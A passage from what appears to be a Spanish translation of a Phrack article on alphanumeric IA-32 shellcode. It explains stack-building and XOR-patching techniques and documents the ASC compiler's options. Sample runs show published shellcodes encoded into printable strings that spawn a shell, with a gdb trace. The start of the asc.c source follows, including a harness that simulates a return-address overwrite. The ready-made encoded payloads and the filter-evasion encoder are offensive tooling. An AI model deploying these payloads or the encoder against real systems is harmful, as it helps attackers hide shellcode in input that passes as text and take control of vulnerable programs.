+Tambien repetiremos en el valor <disp8>, porque algunos valores pueden darnos
+un offset facil de generar.
+Que contendra la [data] en tiempo de ejecucion?
+Usaremos exactamente las mismas manipulaciones que para la "tecnica de pila",
+excepto que aqui, podemos (DEBEMOS !!!) tener directamente guardados valores
+alfanumericos en nuestra [data].
+
+Otro problema es que solo podemos usar registros <r8>,<r16> o <r32>.
+Nos previene de patchear 3 bytes con solo una instruccion XOR sin modificar
+bytes previos o siguientes.
+
+Finalmente, una vez patcheados algunos bytes, debemos incrementar nuestro
+offset para obtener los siguientes bytes que necesitamos patchear. Podemos
+simplemente incrementar nuestro <base>, o incrementar nuestro valor <disp8>
+si <disp8> es siempre alfanumerico.
+
+
+Para finalizar esta descripcion de las tecnicas, recordemos de nuevo que no
+podemos usar todos los registros y modos de direccionamiento... Solo podemos
+usar los que son "compatibles con alfanumericos". Por ejemplo, en la "tecnica
+de patching XOR", decidimos usar los siguientes registros:
+
+ <base> = ebx | edi
+ <index> = ebp
+ XOR register = eax | ecx
+ NOT register = dl | dh | edx | esi
+
+Notemos que esos registros son ubicados al azar, para agregar algunas
+habilidades basicas de polimorfismo (lee alphanumeric_get_register() en
+asc.c).
+
+
+
+----| Algunas arquitecturas y consideraciones
+
+
+Ahora, analizaremos diferentes arquitecturas generales y consideraciones para
+generar shellcodes alfanumericos.
+
+
+Para la "tecnica de patching XOR", la unica traba que tenemos que conocer
+es la direccion de nuestro shellcode. Usualmente esto es trivial: usamos esta
+direccion para overflowear una direccion de retorno. Por ejemplo, si
+sobreescribimos un valor de retorno, podemos recuperarlo facilmente al
+principio de nuestro shellcode (lee alphanumeric_get_address_stack() y
+la opcion "-a stack" en asc.c):
+
+ dec esp
+ dec esp
+ dec esp
+ dec esp
+ pop <r32>
+
+La direccion puede tambien ser guardada en un registro (ve la opcion
+"-a <r32>" en asc.c). En este caso, no sera necesaria ninguna manipulacion
+preliminar.
+
+
+Para la "tecnica stack", podemos tener diferentes arquitecturas interesantes,
+dependiendo de la posicion del buffer que tratamos de romper.
+Analicemos algunos de ellos brevemente.
+
+Si nuestro shellcode esta en la pila, seguido por suficiente espacio y por
+una direccion de retorno, esto es realmente perfecto. Miremos que esta
+pasandole a nuestra pila:
+
+ .... AA  AA  AA  AA  00  00  00  00  00  00  RR  RR  RR  RR  SS  SS ....
+     [EIP]                                                   [ESP]
+
+ .... AA  AA  AA  AA  00  00  00  00  00  00  RR  BB  BB  BB  SS  SS ....
+      -->[EIP]                                   [ESP]<---------
+
+Nuestro shellcode no alfanumerico desciende para encontrar al final de
+nuestro shellcode compilado. Una vez que hemos construido nuestro
+shellcode original entero, podemos simplemente construir instrucciones
+relleno para conectar ambas shellcodes.
+
+ .... AA  AA  AA  AA  PP  PP  PP  PP  PP  PP  RR  BB  BB  BB  SS  SS ....
+      ------>[EIP]   [ESP]<-------------------------------------
+
+ .... AA  AA  AA  AA  PP  PP  PP  PP  PP  PP  RR  BB  BB  BB  SS  SS ....
+      -------------------------------------->[EIP]
+
+Donde: AA representa bytes de nuestro shellcode alfanumerico compilado.
+       00 representa posiciones no usadas en la pila.
+       SS representa bytes ya presentes en la pila.
+       RR representa bytes de nuestra direccion de retorno.
+       BB representa bytes de nuestro shellcode generado no alfanumerico.
+       PP representa bytes de instrucciones simples de relleno (ej: INC ECX).
+
+Para usar este metodo, debemos tener un shellcode original con un tama~o menor
+comparado con el espacio entre el final de nuestro shellcode compilado y el
+valor de ESP al principio de la ejecucion de nuestro shellcode.
+Debemos tambien estar seguros de que las ultimas manipulaciones en la pila
+(para generar instrucciones de relleno) no sobreescribiran las ultimas
+instrucciones de nuestro shellcode compilado. Si nosotros simplemente
+generamos instrucciones de relleno alfanumericas, no deberia haber ningun
+problema.
+Podemos tambien agregar algunas instrucciones de relleno al final de nuestro
+shellcode alfanumerico compilado, y dejarlas ser sobreescritas por nuestras
+instrucciones de relleno generadas. Este consideracion es interesante para
+fuerza bruta (ve la opcion "-s null" en asc.c).
+
+Podemos tambien proceder en una forma ligeramente diferente, si el espacio
+entre nuestro shellcode compilado y el shellcode original tiene un largo
+alfanumerico (<disp8> alfanumerico). Simplemente usamos 2 saltos
+condicionales inversos, como estos:
+
+ [final de nuestro shellcode compilado]
+ jo <disp8>+1 -+
+               |
+ jno <disp8> --+
+               |
+ ...           |
+               |
+label: <-------+
+ [comienzo de nuestro shellcode original no alfanumerico]
+
+
+Podemos tambien combinar tecnicas "stack" y "patches". Construimos nuestro
+shellcode original en la pila (1), y simplemente saltamos (jump) a el
+una vez construido (3). El problema es que no tenemos instrucciones jump
+alfanumericas. Generaremos JMP ESP simplemente usando la "tecnica de patches"
+(2) en un byte (ve la opcion "-s jmp" en asc.c):
+
+                                            +--patch (2)-+
+                                            |            |
+ [codigo no alfanumerico construyendo][JMP ESP codigo patcheando][jmp esp]
+               |                                               |
+ +-------------+---------jump (3)------------------------------+
+ |             |
+ |           construir (1)
+ |             |
+ +-> [codigo no alfanumerico]
+
+Podemos tambien reemplazar el JMP ESP por la siguiente secuencia, mas facil
+de generar (ve la opcion "-s ret" en asc.c):
+
+ push esp
+ ret
+
+
+Finalmente, podemos generar todavia otro estilo de shellcode. Supon que
+tenemos un shellcode no alfanumerico realmente grande. Quiza es mas
+interesante para comprimirlo, y escribir un motor peque~o de descompresion
+no alfanumerico (ve la opcion "-s call" en asc.c):
+
+                                            +--patch (2)--+
+                                            |             |
+ [codigo no alfanumerico construyendo][CALL ESP codigo patcheando][call esp]
+ [data]
+               |                                                 |
+ +-------------+---------call (3)--------------------------------+
+ |             |
+ |           construir (1)
+ |             |
+ |   <---------+-------------------------------->
+ |
+ +-> [pop <r32>][motor de descompresion][jmp <r32>]
+         (4)             (5)              (6)
+
+Una vez que CALL ESP es ejecutado (3), la direccion de [data] es pusheada en
+la pila. El motor solo tiene que popearlo en un registro (4), puede entonces
+descomprimir los datos para construir el shellcode original (5), y finalmente
+saltar a el (6).
+
+Como podemos ver, las posibilidades son realmente inacabables!
+
+
+
+----| ASC, un Alphanumeric Shellcode Compiler
+             (Compilador de Shellcode Alfanumerico)
+
+
+ASC ofrece algunas de las tecnicas propuestas arriba.
+Que hay sobre de las posibles opciones?
+
+
+OPCIONES DE COMPILACION:
+
+Estas opciones nos permiten especificar las tecnicas y arquitectura que
+nuestro shellcode alfanumerico usara para construir el shellcode original.
+
+-a[ddress] stack|<r32> : permite especificar la direccion de comienzo del
+ shellcode (util para la tecnica de patching).
+ "stack" significa que obtenemos la direccion de la pila.
+ <r32> permite especificar un registro conteniendo esta direccion de
+ comienzo.
+
+-m[ode] stack|patches : permite elegir el tipo de shellcode alfanumerico
+que queremos generar.
+ "stack" genera nuestro shellcode en la pila.
+ "patches" genera nuestro shellcode por XOR patching.
+
+-s[tack] call|jmp|null|ret : especifica el metodo (si "-m stack") para
+ volver al shellcode original en la pila.
+ "call" usa una instruccion CALL ESP.
+ "jmp" usa una instruccion JMP ESP.
+ "null" no vuelve al codigo (si el codigo original esta justo despues del
+ shellcode alfanumerico).
+ "ret" usa PUSH ESP e instrucciones RET.
+
+
+OPCIONES DE DEBUGGING:
+
+Estas opciones nos permiten insertar algunos breakpoints (int3), y observar
+la ejecucion de nuestro shellcode alfanumerico.
+
+-debug-start : inserta un breakpoint al principio del shellcode compilado.
+
+-debug-build-original : inserta un breakpoint antes de construir el shellcode
+ original.
+
+-debug-build-jump : inserta un breakpoint antes de construir el codigo jump
+ (si especificamos la opcion -s). Inutil si "-s null".
+
+-debug-jump : inserta un breakpoint antes de ejecutar la instruccion jump
+ (si especificamos la opcion -s). Si "-s null", el breakpoint simplemente
+ estara al final del shellcode alfanumerico.
+
+-debug-original : inserta un breakpoint al principio del shellcode original.
+ Este breakpoint sera construido en el tiempo de ejecucion.
+
+
+OPCIONES INPUT/OUTPUT:
+
+-c[har] <char[] name> : especifica una nombre de variable C donde un
+ shellcode es guardado:
+ 
+ char array[]= "blabla" /* mi shellcode */
+               "blabla";
+ 
+ Si ningun nombre es especificado y varios arrays char[] estan presentes,
+ el primero sera usado. El parsing reconoce comentarios de C y arrays
+ multi-linea. Esta opcion tambien nos asegura que el archivo input es un
+ archivo C, y no un archivo binario.
+
+-f[ormat] bin|c : especifica el formato output de archivo. Si es elegido el
+ formato de C, ASC escribe un codigo minusculo para ejecutar el shellcode
+ alfanumerico, simulando un overflow en la direccion RET. Este codigo no
+ puede correr correctamente si las opciones "-a <r32>" o "-s null" fueron
+ usadas.
+
+-o[utput] <archivo output> : permite especificar el nombre de archivo output.
+
+
+EJEMPLOS:
+
+Finalicemos con algunos ejemplos practicos, usando shellcodes desde lindos
+previos textos de Phrack ;)
+
+
+Primero, echa un vistazo a P49-14 (Texto de Aleph One).
+El primer shellcode que el escribio (testsc.c) contiene 00 bytes (normalmente
+no es un problema para ASC). Nosotros generamos un archivo C y un shellcode
+alfanumerico usando "patches XOR":
+
+ rix@debian:~/phrack$ ./asc -c shellcode -f c -o alpha.c p49-14
+ Reading p49-14 ... (61 bytes)
+ Shellcode (390 bytes):
+ LLLLYhb0pLX5b0pLHSSPPWQPPaPWSUTBRDJfh5tDSRajYX0Dka0TkafhN9fYf1Lkb0TkdjfY0Lkf0Tkgfh6rfYf1Lki0tkkh95h8Y1LkmjpY0Lkq0tkrh2wnuX1Dks0tkwjfX0Dkx0tkx0tkyCjnY0LkzC0TkzCCjtX0DkzC0tkzCj3X0Dkz0TkzC0tkzChjG3IY1LkzCCCC0tkzChpfcMX1DkzCCCC0tkzCh4pCnY1Lkz1TkzCCCCfhJGfXf1Dkzf1tkzCCjHX0DkzCCCCjvY0LkzCCCjdX0DkzC0TkzCjWX0Dkz0TkzCjdX0DkzCjXY0Lkz0tkzMdgvvn9F1r8F55h8pG9wnuvjrNfrVx2LGkG3IDpfcM2KgmnJGgbinYshdvD9d
+ Writing alpha.c ...
+ Done.
+ rix@debian:~/phrack$ gcc -o alpha alpha.c
+ rix@debian:~/phrack$ ./alpha
+ sh-2.03$ exit
+ exit
+ rix@debian:~/phrack$
+
+Prece funcionar perfectamente. Notemos que el shellcode alfanumerico es
+tambien escrito para stdout.
+
+
+Ahora, compilemos el shellcode de Klog (P55-08). Elegimos la "tecnica de la
+pila", con un JMP ESP para volver a nuestro shellcode original. Tambien
+insertamos algunos breakpoints:
+
+ rix@debian:~/phrack$ ./asc -m stack -s jmp -debug-build-jump
+  -debug-jump -debug-original -c sc_linux -f c -o alpha.c P55-08
+ Reading P55-08 ... (50 bytes)
+ Shellcode (481 bytes):
+ LLLLZhqjj9X5qjj9HPWPPSRPPafhshfhVgfXf5ZHfPDhpbinDfhUFfXf5FifPDSDhHIgGX516poPDTYI11fhs2DTY01fhC6fXf5qvfPDfhgzfXf53EfPDTY01fhO3DfhF9fXf5yFfPDTY01fhT2DTY01fhGofXf5dAfPDTY01fhztDTY09fhqmfXf59ffPDfhPNDfhbrDTY09fhDHfXf5EZfPDfhV4fhxufXf57efPDfhl5DfhOSfXf53AfPDfhV4fhFafXf5GzfPDfhxGDTY01fh4IfXf5TFfPDfh7VDfhhvDTY01fh22fXf5m5fPDfh3VDfhWvDTY09fhKzfXf5vWfPDTY01fhe3Dfh8qfXf5fzfPfhRvDTY09fhXXfXf5HFfPDfh0rDTY01fhk5fXf5OkfPfhwPfXf57DfPDTY09fhz3DTY09SQSUSFVDNfhiADTY09WRa0tkbfhUCfXf1Dkcf1tkc3UX
+ Writing alpha.c ...
+ Done.
+ 
+ rix@debian:~/phrack$ gcc -o alpha alpha.c 
+ rix@debian:~/phrack$ gdb alpha
+ GNU gdb 19990928
+ Copyright 1998 Free Software Foundation, Inc.
+ GDB is free software, covered by the GNU General Public License, and you are
+ welcome to change it and/or distribute copies of it under certain conditions.
+ Type "show copying" to see the conditions.
+ There is absolutely no warranty for GDB.  Type "show warranty" for details.
+ This GDB was configured as "i686-pc-linux-gnu"...
+ (no debugging symbols found)... 
+ (gdb) run
+ Starting program: /home/rix/phrack/alpha
+ (no debugging symbols found)...(no debugging symbols found)...
+ Program received signal SIGTRAP, Trace/breakpoint trap.
+ 0xbffffb1d in ?? ()                          ;-debug-build-jump 
+ (gdb) x/22i 0xbffffb1d
+ 0xbffffb1d:     push   %ebx
+ 0xbffffb1e:     push   %ecx
+ 0xbffffb1f:     push   %ebx                  ;EDX contendra 0xFFFFFFFF.
+ 0xbffffb20:     push   %ebp
+ 0xbffffb21:     push   %ebx
+ 0xbffffb22:     inc    %esi                  ;ESI contiene 0xFFFFFFFF.
+ 0xbffffb23:     push   %esi                  ;ESI contiene 0.
+ 0xbffffb24:     inc    %esp                  ;00 00 00 en la pila.
+ 0xbffffb25:     dec    %esi                  ;restaura ESI.
+ 0xbffffb26:     pushw  $0x4169               ;pushea un word alfanumerico.
+ 0xbffffb2a:     inc    %esp                  ;un byte alfanumerico en la
+                                              ;pila.
+ 0xbffffb2b:     push   %esp
+ 0xbffffb2c:     pop    %ecx                  ;ECX contiene ESP (la
+                                              ; direccion del byte).
+ 0xbffffb2d:     xor    %bh,(%ecx)            ;NOT en este byte (EBP
+                                              ; contendra el offset dword).
+ 0xbffffb2f:     push   %edi                  ;ESI contendra 0xFFFFFFFF.
+ 0xbffffb30:     push   %edx
+ 0xbffffb31:     popa
+ 0xbffffb32:     xor    %dh,0x62(%ebx,%ebp,2) ;NOT en el primer byte para
+                                              ;patchear (nuestro 0xCC, int3)
+                                              ; Notemos el uso de
+                                              ; <disp8> alfanumerico, el
+                                              ; uso de EBX (direccion de
+                                              ; nuestro shellcode)
+                                              ; y el uso de EBP
+                                              ; (el offset previamente
+                                              ; guardado).
+ 0xbffffb36:     pushw  $0x4355
+ 0xbffffb3a:     pop    %ax                   ;AX contiene 0x4355.
+ 0xbffffb3c:     xor    %ax,0x63(%ebx,%ebp,2) ;XOR los siguientes dos bytes
+                                              ; (<disp8> es ahora 0x63).
+ 0xbffffb41:     xor    %si,0x63(%ebx,%ebp,2) ;NOT estos 2 bytes.
+ (gdb) x/3bx 0xbffffb41+5                     ;O16 + XOR + ModR/M +
+                                              ; SIB + <disp8> = 5 bytes
+ 0xbffffb46:     0x33    0x55    0x58         ;Los 3 bytes que patcheamos:
+                                              ; NOT 0x33 = 0xCC => INT 3
+                                              ; NOT (0x55 XOR 0x55) = 0xFF
+                                              ; NOT (0x43 XOR 0x58) = 0xE4
+                                              ;  => JMP ESP
+ (gdb) cont
+ Continuing.
+
+ Program received signal SIGTRAP, Trace/breakpoint trap.
+ 0xbffffb47 in ?? ()                          ;-debug-jump
+ (gdb) x/1i 0xbffffb47
+ 0xbffffb47:     jmp    *%esp                 ;nuestro jump
+ (gdb) info reg esp
+ esp            0xbffffd41       -1073742527
+ (gdb) cont                                   ;Ejecutemos este JMP ESP.
+ Continuing.
+
+ Program received signal SIGTRAP, Trace/breakpoint trap.
+ 0xbffffd42 in ?? ()                          ;(ESP previo)+1
+                                              ; (por nuestro INT3). Estamos
+                                              ; ahora en nuestro shellcode
+                                              ; original.
+ (gdb) cont                                   ;Ejecutemoslo ;)
+ Continuing.
+ sh-2.03$ exit                                ;Finalmente!!!
+ exit
+ (no debugging symbols found)...(no debugging symbols found)...
+ Program exited normally.
+ (gdb)
+
+
+
+----| Conclusion
+
+
+Escribir shellcodes alfanumericos para IA32 es finalmente facilmente posible.
+Pero usar solo direcciones alfanumericas es menos obvio. Ciertamente, ese es
+el principal problema encontrado cuando simplemente queremos usar caracteres
+alfanumericos.
+
+En algunos casos particulares, sera sin embargo posible. Trataremos de
+volver a instrucciones que vuelven ellas mismas para nuestro shellcode.
+Por ejemplo, en sistemas Win32, podemos a veces encontrar interesantes
+instrucciones en direcciones como 0x0041XXXX (XX son caracteres
+alfanumericos). Por lo que podemos generar tales direcciones de retorno.
+El sobreescribimiento parcial de direcciones es a veces tambien interesante,
+porque podemos tomar ventaja de bytes ya presentes en la pila, y
+principalmente tomar ventaja del byte nulo (que no podemos generar),
+automaticamente copiado al final de la cadena C.
+Nota que, a veces, dependiendo de que tratamos de exploitear, podemos usar
+algunos otros caracteres, por ejemplo '_', '@', '-' o clasicos caracteres.
+Es obvio, en esos casos, que necesitaran ser muy precisos.
+
+
+La "tecnica de la pila" parece necesitar una pila ejecutable... Pero podemos
+modificar el valor de ESP al principio de nuestro shellcode, y llevarlo
+apuntando a nuestro monton. Sin embargo, necesitamos patchear la instruccion
+POP ESP, porque no esta "compilada alfanumericamente".
+
+Excepto, el tama~o (posiblemente conlleve problemas), tambien debemos
+mencionar otras desventajas de estas tecnicas: los shellcodes compilados son
+vulnerables a conversiones toupper()/tolower(). Escribiendo un shellcode
+alfanumerico y resistente a toupper()/tolower() es una tarea casi imposible
+(recuerda el primer array, con instrucciones utilizables).
+
+
+Este texto muestra eso, contrariamente a las ideas recibidas, un codigo
+ejecutable puede ser escrito, y guardado casi en donde sea. Nunca mas confies
+en que un string se ve perfectamente legal: quiza es un shellcode bien
+disfrazado ;)
+
+
+Gracias y Hola a (la gente es ordenada alfanumericamente :P ):
+- Phrack Staff
+- Los chicos de Devhell, HERT & TESO: particularmente analyst, binf, gaius,
+   mayhem, klog, kraken & skyper.
+- dageshi, eddow, lrz, neuro, nite, obscurer, tsychrama.
+                                                              rix@hert.org
+
+
+----| Codigo
+
+Esto deberia compilar bien en cualquier Linux box con "gcc -o asc asc.c".
+Es distribuido bajo los terminos de la GNU GENERAL PUBLIC LICENSE.
+Si tienes problemas o comentarios, contactame (rix@hert.org).
+
+<++> asc.c !707307fc
+/******************************************************************************
+ *                ASC : IA 32 Alphanumeric Shellcode Compiler                 *
+ ******************************************************************************
+ *
+ * VERSION: 0.9.1
+ *
+ *
+ * LAST UPDATE: Fri Jul 27 19:42:08 CEST 2001
+ *
+ *
+ * LICENSE:
+ *  ASC - Alphanumeric Shellcode Compiler
+ *
+ *  Copyright 2000,2001 - rix
+ *
+ *  All rights reserved.
+ *
+ *  Redistribution and use in source and binary forms, with or without
+ *  modification, are permitted provided that the following conditions
+ *  are met:
+ *  1. Redistributions of source code must retain the above copyright
+ *     notice, this list of conditions and the following disclaimer.
+ *  2. Redistributions in binary form must reproduce the above copyright
+ *     notice, this list of conditions and the following disclaimer in the
+ *     documentation and/or other materials provided with the distribution.
+ *
+ *  THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
+ *  ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+ *  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+ *  ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
+ *  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+ *  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
+ *  OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+ *  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
+ *  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
+ *  OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
+ *  SUCH DAMAGE.
+ *
+ *
+ * POR HACER:
+ *  - crear LibASC, una libreria conteniendo todas las funciones.
+ *  - permitir especificacion de caracteres aceptables no-alfanumericos.
+ *  - generar secuencias de instrucciones relleno.
+ *  - encodear caracteres alfanumericos, para evitar coincidencia de patron.
+ *  - insertar instrucciones basura (polimorfismo) y modificar existente.
+ *  - optimizar "tecnica de patch" cuando el offset < 256 y es alfanumerico.
+ *  - calcular automaticamente tama~o de relleno para la tecnica "stack sin
+ *    jump".
+ *  - Formato C output: simular direccion en registro, relleno,...
+ *  - usar direcciones constantes para shellcode compilado.
+ *  - modificar la direccion de comienzo de ESP para "tecnica stack".
+ *  - modos de conversion de formatos simples de shellcode (no compilacion).
+ *  - insertar espacios y puntuacion para imitar frases clasicas.
+ *
+ *
+ * CONTACTO: rix <rix@hert.org>
+ *
+ ******************************************************************************/
+
+#include <stdio.h>
+#include <getopt.h>
+#include <stdarg.h>
+#include <string.h>
+#include <time.h>
+
+/* +------------------------------------------------------------------------+ */
+/* |                       FUNCIONES DE NUMEROS RANDOM                      | */
+/* +------------------------------------------------------------------------+ */
+
+/* inicializar el generador de numeros pseudo-random */
+/* ================================================= */
+void random_initialize() {
+ srand((unsigned int)time(0));
+}
+
+
+/* obtener un entero random i (0<=i<max) */
+/* ===================================== */
+int random_get_int(int max) {
+ return (rand()%max);
+}
+
+/* +------------------------------------------------------------------------+ */
+/* |                        FUNCIONES DE SHELLCODES                         | */
+/* +------------------------------------------------------------------------+ */
+
+/* esta estructura contendra todos nuestros shellcodes */
+/* =================================================== */
+struct Sshellcode {
+ unsigned char* opcodes; /* opcodes bytes */
+ int size; /* tama~o de opcodes bytes */
+};
+
+
+/* asignar una nueva estructura Sshellcode */
+/* ======================================= */
+struct Sshellcode *shellcode_malloc() {
+ struct Sshellcode *ret;
+
+ if ((ret=(struct Sshellcode*)malloc(sizeof(struct Sshellcode)))!=NULL) {
+  ret->opcodes=NULL;
+  ret->size=0;
+ }
+ return ret;
+}
+
+
+/* inicializar una estructura Sshellcode existente */
+/* =============================================== */
+void shellcode_zero(struct Sshellcode *shellcode) {
+ if (shellcode==NULL) return;
+
+ if (shellcode->opcodes!=NULL) free(shellcode->opcodes);
+ shellcode->opcodes=NULL;
+ shellcode->size=0;
+}
+
+
+/* liberar una estructura Sshellcode existente */
+/* =========================================== */
+void shellcode_free(struct Sshellcode *shellcode) {
+ if (shellcode!=NULL) {
+  shellcode_zero(shellcode);
+  free(shellcode);
+ }
+}
+
+
+/* devolver un string asignado desde un Sshellcode existente */
+/* ========================================================= */
+char *shellcode_malloc_string(struct Sshellcode *shellcode) {
+ char *ret;
+
+ if (shellcode==NULL) return NULL;
+
+ if (shellcode->opcodes==NULL) return "";
+
+ if ((ret=(char*)malloc(shellcode->size+1))==NULL) return NULL;
+ memcpy(ret,shellcode->opcodes,shellcode->size);
+ ret[shellcode->size]=0;
+ return ret;
+}
+
+
+/* sobreescribir un Sshellcode existente con un Sshellcode */
+/* ======================================================= */
+struct Sshellcode *shellcode_cpy(struct Sshellcode *destination,struct Sshellcode *source) {
+ if (destination==NULL) return NULL;
+
+ shellcode_zero(destination);
+
+ if (source!=NULL) {
+  if (source->opcodes!=NULL) { /* if source contains a shellcode, we copy it */
+   if ((destination->opcodes=(unsigned char*)malloc(source->size))==NULL) return NULL;
+   memcpy(destination->opcodes,source->opcodes,source->size);
+   destination->size=source->size;
+  }
+ }
+
+ return destination;
+}
+
+
+/* apendizar un Sshellcode al final de un Sshellcode existente */
+/* =========================================================== */
+struct Sshellcode *shellcode_cat(struct Sshellcode *destination,struct Sshellcode *source) {
+ if (destination==NULL) return NULL;
+
+ if (destination->opcodes==NULL) shellcode_cpy(destination,source);
+ else { /* el destino ya contiene un shellcode */
+
+  if (source!=NULL) {
+   if (source->opcodes!=NULL) { /* si el codigo contiene un shellcode, lo copiamos */
+
+    if ((destination->opcodes=(unsigned char*)realloc(destination->opcodes,destination->size+source->size))==NULL) return NULL;
+    memcpy(destination->opcodes+destination->size,source->opcodes,source->size);
+    destination->size+=source->size;
+   }
+  }
+ }
+ return destination;
+}
+
+
+/* agregar un byte al final de un Sshellcode existente */
+/* =================================================== */
+struct Sshellcode *shellcode_db(struct Sshellcode *destination,unsigned char c) {
+ struct Sshellcode *ret,*tmp;
+
+ /* construir un byte Sshellcode minusculo */
+ tmp=shellcode_malloc();
+ if ((tmp->opcodes=(unsigned char*)malloc(1))==NULL) return NULL;
+ tmp->opcodes[0]=c;
+ tmp->size=1;
+
+ /* copiarlo al final de un Sshellcode existente */
+ ret=shellcode_cat(destination,tmp);
+ shellcode_free(tmp);
+ return ret;
+}
+
+
+/* leer un Sshellcode desde un archivo binario */
+/* =========================================== */
+int shellcode_read_binary(struct Sshellcode *shellcode,char *filename) {
+ FILE *f;
+ int size;
+
+ if (shellcode==NULL) return -1;
+
+ if ((f=fopen(filename,"r+b"))==NULL) return -1;
+
+ fseek(f,0,SEEK_END);
+ size=(int)ftell(f);
+ fseek(f,0,SEEK_SET);
+
+ if ((shellcode->opcodes=(unsigned char*)realloc(shellcode->opcodes,shellcode->size+size))==NULL) return -1;
+ if (fread(shellcode->opcodes+shellcode->size,size,1,f)!=1) {
+  shellcode_zero(shellcode);
+  return -1;
+ }
+ shellcode->size+=size;
+ fclose(f);
+ return shellcode->size;
+}
+
+
+/* leer un Sshellcode desde un archivo C */
+/* ===================================== */
+#define LINE_SIZE 80*256
+#define HEXADECIMALS "0123456789ABCDEF"
+
+int shellcode_read_C(struct Sshellcode *shellcode,char *filename,char *variable) {
+ FILE *f;
+ struct Sshellcode *binary;
+ unsigned char *hex,*p,c;
+ int i;
+
+ if (shellcode==NULL) return -1;
+
+ hex=HEXADECIMALS;
+ binary=shellcode_malloc();
+ if (shellcode_read_binary(binary,filename)==-1) {
+  shellcode_free(binary);
+  return -1;
+ }
+ shellcode_db(binary,0); /* for string searching */
+ p=binary->opcodes;
+
+ while (p=strstr(p,"char ")) { /* "char " encontrado */
+  p+=5;
+  while (*p==' ') p++;
+  if (!variable) { /* si no fue especificada una variable */
+   while ((*p!=0)&&(*p!='[')) p++; /* buscar el '[' */
+   if (*p==0) {
+   shellcode_free(binary);
+    return -1;
+   }
+  }
+  else { /* una variable fue especificada */
+   if (memcmp(p,variable,strlen(variable))) continue; /* comparar la variable */
+   p+=strlen(variable);
+   if (*p!='[') continue;
+  }
+  /* *p='[' */
+  p++;
+  if (*p!=']') continue;
+  /* *p=']' */
+  p++;
+  while ((*p==' ')||(*p=='\r')||(*p=='\n')||(*p=='\t')) p++;
+  if (*p!='=') continue;
+  /* *p='=' */
+  p++;
+  while (1) { /* buscar el principio de un "string" */
+   while ((*p==' ')||(*p=='\r')||(*p=='\n')||(*p=='\t')) p++;
+
+   while ((*p=='/')&&(*(p+1)=='*')) { /* loop hasta el comienzo de un comentario */
+    p+=2;
+    while ((*p!='*')||(*(p+1)!='/')) p++; /* buscar el final del comentario */
+    p+=2;
+    while ((*p==' ')||(*p=='\r')||(*p=='\n')||(*p=='\t')) p++;
+   }
+
+   if (*p!='"') break; /* si este es el final de todo "string" */
+   /* *p=begin '"' */
+   p++;
+   while (*p!='"') { /* loop hasta el final de "string" */
+    if (*p!='\\') {
+     shellcode_db(shellcode,*p);
+    }
+    else {
+     /* *p='\' */
+     p++;
+     if (*p=='x') {
+      /* *p='x' */
+      p++;
+      *p=toupper(*p);
+      for (i=0;i<strlen(hex);i++) if (hex[i]==*p) c=i<<4; /* primer digito */
+      p++;
+      *p=toupper(*p);
+      for (i=0;i<strlen(hex);i++) if (hex[i]==*p) c=c|i; /* segundo digito */
+      shellcode_db(shellcode,c); 
+     }  
+    }
+    p++;
+   }
+   /* final de un "string" */
+   p++;
+  }
+  /* final de todo "string" */
+  shellcode_free(binary);
+  return shellcode->size;
+ }
+ shellcode_free(binary);
+ return -1;
+}
+
+
+/* escribir un Sshellcode a un archivo binario */
+/* =========================================== */
+int shellcode_write_binary(struct Sshellcode *shellcode,char *filename) {
+ FILE *f;
+
+ if (shellcode==NULL) return -1;
+
+ if ((f=fopen(filename,"w+b"))==NULL) return -1;
+
+ if (fwrite(shellcode->opcodes,shellcode->size,1,f)!=1) return -1;
+ fclose(f);
+ return shellcode->size;
+}
+
+
+/* escribir un Sshellcode a un archivo C */
+/* ===================================== */
+int shellcode_write_C(struct Sshellcode *shellcode,char *filename) {
+ FILE *f;
+ char *tmp;
+ int size;
+
+ if (shellcode==NULL) return -1;
+
+ if ((tmp=shellcode_malloc_string(shellcode))==NULL) return -1;
+
+ if ((f=fopen(filename,"w+b"))==NULL) return -1; 
+
+ fprintf(f,"char shellcode[]=\"%s\";\n",tmp);
+ free(tmp);
+ fprintf(f,"\n");
+ fprintf(f,"int main(int argc, char **argv) {\n");
+ fprintf(f," int *ret;\n");
+
+ size=1;
+ while (shellcode->size*2>size) size*=2;
+
+ fprintf(f," char buffer[%d];\n",size);
+ fprintf(f,"\n");
+ fprintf(f," strcpy(buffer,shellcode);\n");
+ fprintf(f," ret=(int*)&ret+2;\n");
+ fprintf(f," (*ret)=(int)buffer;\n");
+ fprintf(f,"}\n");
+
+ fclose(f);
+ return shellcode->size;
+}
+
+
+/* imprimir un Sshellcode en pantalla */
+/* ================================== */
+int shellcode_print(struct Sshellcode *shellcode) {
+ char *tmp;
+
+ if (shellcode==NULL) return -1;
+
+ if ((tmp=shellcode_malloc_string(shellcode))==NULL) return -1;
+ printf("%s",tmp);
+ free(tmp);
+ return shellcode->size;
+}
+
+/* +------------------------------------------------------------------------+ */
+/* |                      DEFINICION DE MACROS IA32                         | */
+/* +------------------------------------------------------------------------+ */
+
+/* definiciones macro utiles */
+/* ========================= */
+/*
+ SYNTAXIS:
+  r=registro
+  d=dword
+  w=word
+  b,b1,b2,b3,b4=bytes
+  n=index entero
+  s=Sshellcode
+*/
+
+/* registros */
+#define EAX 0
+#define EBX 3
+#define ECX 1
+#define EDX 2
+#define ESI 6
+#define EDI 7
+#define ESP 4
+#define EBP 5
+#define REGISTERS 8
+
+/* operadores booleanos (bytes) */
+#define XOR(b1,b2) (((b1&~b2)|(~b1&b2))&0xFF)
+#define NOT(b) ((~b)&0xFF)
+
+/* constructores de tipo */
+#define DWORD(b1,b2,b3,b4) ((b1<<24)|(b2<<16)|(b3<<8)|b4) /* 0xb1b2b3b4 */
+#define WORD(b1,b2) ((b1<<8)|b2) /* 0xb1b2 */
+
